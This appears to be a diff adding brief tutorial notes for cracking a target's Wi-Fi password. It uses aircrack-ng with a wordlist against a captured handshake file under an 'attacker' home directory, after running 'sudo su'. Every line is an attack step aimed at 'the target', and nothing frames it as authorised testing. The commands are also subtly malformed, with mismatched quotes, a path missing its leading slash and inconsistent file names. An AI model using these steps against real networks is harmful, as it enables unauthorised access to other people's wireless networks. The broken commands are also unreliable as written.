@@ -1,0 +1,9 @@
+ sudo su
+ The command bellow enables you to obtain the BSSID as well as the key of the target
+ aircrack-ng “/home/attacker/Documents/name_Pcap.cap”
+ The commands bellow helps to obtain thetarget password
+ aircrack-ng -b bssid -w ‘home/attacker/Desktop/wifipass.txt’
+‘home/attacker/Documents/name_Pcap.cap’ OR
+ aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/wifipass.txt’
+'home/attacker/Documents/W!F!_Pcap.cap'
+ The results will most likely be next to the message KEY FOUND!,
